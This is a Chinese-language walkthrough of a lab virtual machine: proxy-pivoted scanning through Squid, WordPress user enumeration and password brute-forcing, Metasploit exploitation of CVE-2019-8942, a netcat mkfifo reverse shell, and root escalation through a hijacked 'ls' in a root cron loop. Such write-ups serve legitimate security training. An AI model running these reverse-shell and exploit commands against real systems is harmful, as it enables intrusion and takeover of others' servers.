VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
Nmap scan report for localhost (192.168.253.241)


--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.241 -p- -A

8080/tcp open  http-proxy Squid http proxy 3.5.27
|_http-server-header: squid/3.5.27


--------------------------------------------
--------------------------------------------
3、代理爆破

dirb漏扫代理技巧

dirb http://127.0.0.1/ -p http://192.168.253.241:8080

参考：https://zhuanlan.zhihu.com/p/26549845
----
 -p <proxy[:port]> : Use this proxy. (Default port is 1080)
 -P <proxy_username:proxy_password> : Proxy Authentication.
----

http://127.0.0.1/server-status



--------------------------------------------
--------------------------------------------
4、代理设置跳转

FoxyProxy进行添加：
192.168.253.241
8080

未发现有用的信息！


--------------------------------------------
--------------------------------------------
5、代理技巧-proxychains

proxychains -q nmap -sT -sV -p- 127.0.0.1

80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
1337/tcp open  http       Apache httpd 2.4.29 ((Ubuntu))
8080/tcp open  http-proxy Squid http proxy 3.5.27


发现开启了1337端口：
dirb http://127.0.0.1:1337/ -p http://192.168.253.241:8080

http://127.0.0.1:1337/wordpress/    ---博客页面
http://127.0.0.1:1337/wordpress/wp-admin/    ----博客后台管理地址



--------------------------------------------
--------------------------------------------
6、wpscan代理漏扫

wpscan -eu --wp-content-dir /wp-config --url http://127.0.0.1:1337/wordpress --proxy http://192.168.253.241:8080 --api-token kJ4bhZCgveCcoGJPER7AOsHJTeFDf90Wfj9zu0V6asc

--wp-content-dir /wp-config  ---自定义爆破该目录

发现用户名：
jerome

--------------------------------------------
--------------------------------------------
7、wpscan暴力破解

wpscan --url http://127.0.0.1:1337/wordpress/ --wp-content-dir wp-content/ --proxy http://192.168.253.241:8080 --no-banner -U jerome -P /root/Desktop/rockyou.txt

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - jerome / jerome


--------------------------------------------
--------------------------------------------
8、getshell

WordPress 5.0，2019-8942的是Authenticated Code Execution


search 2019-8942
use exploit/multi/http/wp_crop_rce
set PASSWORD jerome
set Proxies http:192.168.253.241:8080
set RPORT 1337
set RHOSTS 127.0.0.1
set TARGETURI /wordpress
set USERNAME jerome
run

报错提示：[-] Exploit failed: RuntimeError TCP connect-back payloads cannot be used with Proxies. Use 'set ReverseAllowProxy true' to override this behaviour.
[*] Exploit completed, but no session was created.
添加：
set ReverseAllowProxy true
run

[*] Meterpreter session 1 opened (192.168.253.138:4444 -> 192.168.253.241:52718) at 2022-05-12 04:08:42 -0400

成功获得反弹shell！


建立稳定shell：
nc -vlp 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 1234 >/tmp/f
python3 -c 'import pty; pty.spawn("/bin/bash")'



--------------------------------------------
--------------------------------------------
9、内部信息收集

1）uid=1000(jerome) gid=1000(jerome) groups=1000(jerome),27(sudo)
2）/usr/sbin/squid -YC -f /etc/squid/squid.conf
3）@reboot		root	/bin/bash /usr/share/simulate.sh   ---计划任务
4）mysql用户密码：jerome/jerome

-------------------------
cat /usr/share/simulate.sh
#
# This script simulates human behaviour from the root account
#

while true
do
    cd /home/jerome;
    ls;
    sleep 120;
done
-------------------------

--------------------------------------------
--------------------------------------------
10、提权

echo "nc -e /bin/bash 192.168.253.138 6666" >> ls
chmod +x ls


nc -vlp 6666
listening on [any] 6666 ...
connect to [192.168.253.138] from localhost [192.168.253.241] 43632
id
uid=0(root) gid=0(root) groups=0(root)

成功获得root权限！





--------------------------------------------
--------------------------------------------
11、知识拓展

1）squid配置分析
cat /etc/squid/squid.conf
acl Safe_ports port 80
acl Safe_ports port 443
acl Safe_ports port 1337
acl Safe_ports port 8080

acl CONNECT method CONNECT

http_access deny !Safe_ports
acl localhost src 127.0.0.1
acl to_localhost dst 127.0.0.1
acl localnet src 0.0.0.0/8


http_access allow to_localhost
http_access allow localhost
http_access allow localnet
http_access allow CONNECT Safe_ports

http_access deny all

http_port 8080



2）CVE-2019-8942分析

https://nvd.nist.gov/vuln/detail/CVE-2019-8942   ---CVE-2019-8942

https://blog.sonarsource.com/wordpress-image-remote-code-execution/?redirect=rips
详细分析：
http://blog.nsfocus.net/wordpress-5-0-0-rce/

wordpress后台发送如下post请求-> meta_input中有update_post_meta（这个方法的作用是基于POST ID更新POST元字段）->在正常的修改图片操作中，$postarr[meta_input]值会为空，但是可以构造payload使得篡改数据库中对应value的操作得以实现-> $postarr[meta_input]中的key与value被遍历取出，数据库中内容被篡改(成功的篡改了数据库中关于此图片文件的_wp_attached_file值,但是也是仅仅更改了数据库中的记载)->目录穿越漏洞位于wp_crop_image方法(这个方法是用来剪裁图片，想触发漏洞，调用wp_crop_image方法，那么需要自己构造数据包)->action=image-editor(wp-admin\admin-ajax.php中的$core_actions_post数组) -> 想调用wp_crop_image方法，那action要为crop-image(action=crop-image) -> 当调用该函数时，函数首先调用get_attached_file（get_attached_file->通过id 寻找存在数据库中 _wp_attached_file字段->get_attached_file方法会将_wp_attached_file字段中的内容拼接（_wp_attached_file字段中的内容我们已经通过之前步骤成功改为我们的payload）->$uploads[‘basedir’]作为图片的路径返回）->wordpress将会直接加载这个地址(文件系统中根本无法找到这个文件)->在wp_get_attachment_url方法中：该URL由wp-content/uploads目录和由_wp_attached_file条目所提供的文件名组成->wp_coce_Image()方法会将此文件保存，但是在保存时，并没有对传入的参数进行校验，导致了目录穿越的产生->通过wp_mkdir_p建立目录->通过$editor->save将文件保存到生成目录中->通过构造的payload修改数据库中内容，最终会在themes\currentactivetheme目录中生成我们的jpg（cropped-evil.jpg，因为是通过剪裁后的图片，会有一个cropped前缀）

WordPress的主题位于wp-content / themes目录中并为不同的案例提供模板文件。正常情况下，是无法通过web方式访问、写入此目录。但是截止此时，我们通过目录穿越，已经可以将我们的恶意图像文件插入此目录。然后通过加载这个themes，即可执行恶意构造好的图片payload，这个漏洞详情可CVE-2019-6977。



https://www.anquanke.com/post/id/171488
https://zhuanlan.zhihu.com/p/57311862





















































